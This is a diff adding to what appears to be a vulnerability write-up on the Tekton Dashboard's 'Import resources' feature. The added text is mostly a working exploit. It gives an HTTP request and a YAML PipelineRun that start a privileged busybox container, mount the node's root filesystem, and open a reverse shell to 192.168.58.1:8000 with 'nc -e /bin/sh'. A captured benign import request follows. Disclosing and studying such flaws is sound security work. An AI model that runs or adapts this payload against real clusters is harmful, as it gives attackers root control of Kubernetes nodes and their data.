@@ -313,7 +313,187 @@ UID                                            157053df-210e-46cd-8932-7b898348e
 Groups                                         [system:serviceaccounts system:serviceaccounts:tekton-pipelines system:authenticated]
 Extra: authentication.kubernetes.io/pod-name   [tekton-dashboard-7dcdbc4f54-kqggl]
 Extra: authentication.kubernetes.io/pod-uid    [30265944-5df4-45f7-9f81-8e8a3cd1fa60]
+```
+The "Import resources" functionality creates a new attacker-controlled pipelinerun. The following request triggers said pipelinerun including a reverse shell with root privileges (actual node root privileges). Additionaly the nodes file system is mounted inside the pod at /var/noderoot
 
+For editing, the yaml version of the payload is more convenient. In the web dashboard visit PipelineRuns > Create > YAML Mode to create a new run:
 
+```
+POST /apis/tekton.dev/v1/namespaces/tekton-dashboard/pipelineruns/ HTTP/1.1
+Host: 127.0.0.1:9097
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Content-Type: application/json
+Tekton-Client: tektoncd/dashboard
+Content-Length: 983
+Connection: close
 
+{
+    "apiVersion": "tekton.dev/v1",
+    "kind": "PipelineRun",
+    "metadata": {
+        "annotations": {},
+        "generateName": "import-resources-1716387335999-",
+        "labels": {
+            "dashboard.tekton.dev/import": "true"
+        },
+        "namespace": "tekton-dashboard"
+    },
+    "spec": {
+        "pipelineSpec": {
+            "tasks": [
+                {
+                    "name": "fetch-repo",
+                    "taskSpec": {
+                        "metadata": {},
+                        "steps": [
+                            {
+                                "computeResources": {},
+                                "image": "busybox:latest",
+                                "name": "clone",
+                                "script": "#!/usr/bin/env sh\nbusybox nc 192.168.58.1 8000 -e /bin/sh\n",
+                                "volumeMounts": [
+                                    {
+                                        "name": "noderoot",
+                                        "mountPath": "/var/noderoot"
+                                    }
+                                ],
+                                "securityContext": {
+                                    "allowPrivilegeEscalation": true,
+                                    "privileged":true
+                                }
+                            }
+                        ],
+                        "workspaces": [
+                            {
+                                "name": "repo"
+                            }
+                        ]
+                    },
+                    "workspaces": [
+                        {
+                            "name": "repo",
+                            "workspace": "repo"
+                        }
+                    ]
+                }
+            ]
+        },
+        "taskRunTemplate": {
+            "podTemplate": {
+                "volumes": [
+                    {
+                        "name": "noderoot",
+                        "hostPath": {
+                            "path": "/"
+                        }
+                    }
+                ]
+            },
+            "serviceAccountName": "default"
+        },
+        "timeouts": {
+            "pipeline": "1h0m0s"
+        },
+        "workspaces": [
+            {
+                "name": "repo",
+                "volumeClaimTemplate": {
+                    "metadata": {
+                        "creationTimestamp": null
+                    },
+                    "spec": {
+                        "accessModes": [
+                            "ReadWriteOnce"
+                        ],
+                        "resources": {
+                            "requests": {
+                                "storage": "1Gi"
+                            }
+                        }
+                    },
+                    "status": {}
+                }
+            }
+        ]
+    }
+}
+```
+
+yaml version
+```
+apiVersion: tekton.dev/v1
+kind: PipelineRun
+metadata:
+  annotations: {}
+  generateName: import-resources-1716387335999-
+  labels:
+    dashboard.tekton.dev/import: 'true'
+  namespace: tekton-dashboard
+spec:
+  pipelineSpec:
+    tasks:
+      - name: fetch-repo
+        taskSpec:
+          metadata: {}
+          steps:
+            - computeResources: {}
+              image: >-
+                busybox:latest
+              name: clone
+              script: >
+                #!/usr/bin/env sh
+
+                busybox nc 192.168.58.1 8000 -e /bin/sh
+              volumeMounts:
+                - name: noderoot
+                  mountPath: /var/noderoot
+              securityContext:
+                allowPrivilegeEscalation: true
+                privileged: true
+          workspaces:
+            - name: repo
+        workspaces:
+          - name: repo
+            workspace: repo
+  taskRunTemplate:
+    podTemplate:
+      volumes:
+        - name: noderoot
+          hostPath:
+            path: /
+    serviceAccountName: default
+  timeouts:
+    pipeline: 1h0m0s
+  workspaces:
+    - name: repo
+      volumeClaimTemplate:
+        metadata:
+          creationTimestamp: null
+        spec:
+          accessModes:
+            - ReadWriteOnce
+          resources:
+            requests:
+              storage: 1Gi
+        status: {}
+```
+
+```
+POST /apis/tekton.dev/v1/namespaces/tekton-dashboard/pipelineruns/ HTTP/1.1
+Host: 127.0.0.1:9097
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://127.0.0.1:9097/
+Content-Type: application/json
+Tekton-Client: tektoncd/dashboard
+Content-Length: 3864
+Origin: http://127.0.0.1:9097
+Connection: keep-alive
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+
+{"apiVersion":"tekton.dev/v1","kind":"PipelineRun","metadata":{"annotations":{},"generateName":"import-resources-1725898668250-","labels":{"dashboard.tekton.dev/import":"true","gitOrg":"test","gitRepo":"test","gitServer":"github.com"},"namespace":"tekton-dashboard"},"spec":{"params":[{"name":"method","value":"apply"},{"name":"path","value":""},{"name":"repositoryURL","value":"https://github.com/test/test.git"},{"name":"revision","value":""},{"name":"target-namespace","value":"default"}],"pipelineSpec":{"params":[{"default":"apply","description":"Which kubectl command to use to import the resources (apply / create)","name":"method","type":"string"},{"default":".","description":"The path from which resources are to be imported","name":"path","type":"string"},{"description":"The URL of the git repository from which resources are to be imported","name":"repositoryURL","type":"string"},{"default":"","description":"The git revision from which resources are to be imported","name":"revision","type":"string"},{"default":"tekton-pipelines","description":"The namespace in which to create the resources being imported","name":"target-namespace","type":"string"}],"tasks":[{"name":"fetch-repo","params":[{"name":"repositoryURL","value":"$(params.repositoryURL)"},{"name":"revision","value":"$(params.revision)"}],"taskSpec":{"metadata":{},"params":[{"description":"The URL of the git repository from which resources are to be imported","name":"repositoryURL","type":"string"},{"description":"The git revision to clone","name":"revision","type":"string"}],"spec":null,"steps":[{"computeResources":{},"env":[{"name":"PARAM_URL","value":"$(params.repositoryURL)"},{"name":"PARAM_REVISION","value":"$(params.revision)"},{"name":"WORKSPACE_PATH","value":"$(workspaces.repo.path)"}],"image":"ghcr.io/wolfi-dev/git:alpine@sha256:3a118879b998f146812c11630805863f8a769587460938cbcc1daca874d9b57c","name":"clone","script":"#!/usr/bin/env sh\nset -eu\ngit config --global init.defaultBranch main\ngit config --global --add safe.directory \"${WORKSPACE_PATH}\"\ncd \"${WORKSPACE_PATH}\"\ngit init\ngit remote add origin \"${PARAM_URL}\"\ngit fetch --depth=1 --recurse-submodules=yes origin \"${PARAM_REVISION}\"\ngit reset --hard FETCH_HEAD\ngit submodule update --init --recursive\n","securityContext":{"allowPrivilegeEscalation":false,"capabilities":{"drop":["ALL"]}}}],"workspaces":[{"name":"repo"}]},"workspaces":[{"name":"repo","workspace":"repo"}]},{"name":"import-resources","params":[{"name":"path","value":"$(params.path)"},{"name":"target-namespace","value":"$(params.target-namespace)"},{"name":"method","value":"$(params.method)"}],"runAfter":["fetch-repo"],"taskSpec":{"metadata":{},"params":[{"description":"The path from which resources are to be imported","name":"path","type":"string"},{"description":"The namespace in which to create the resources being imported","name":"target-namespace","type":"string"},{"description":"Which kubectl command to use to import the resources (apply / create)","name":"method","type":"string"}],"spec":null,"steps":[{"args":["$(params.method)","-f","$(workspaces.repo.path)/$(params.path)","-n","$(params.target-namespace)"],"command":["kubectl"],"computeResources":{},"image":"docker.io/lachlanevenson/k8s-kubectl:latest","name":"import","securityContext":{"allowPrivilegeEscalation":false,"capabilities":{"drop":["ALL"]}}}],"workspaces":[{"name":"repo"}]},"workspaces":[{"name":"repo","workspace":"repo"}]}]},"taskRunTemplate":{"podTemplate":{"securityContext":{"runAsGroup":65532,"runAsNonRoot":true,"runAsUser":65532,"seccompProfile":{"type":"RuntimeDefault"}}},"serviceAccountName":"default"},"timeouts":{"pipeline":"1h0m0s"},"workspaces":[{"name":"repo","volumeClaimTemplate":{"metadata":{"creationTimestamp":null},"spec":{"accessModes":["ReadWriteOnce"],"resources":{"requests":{"storage":"1Gi"}}},"status":{}}}]}}
 ```
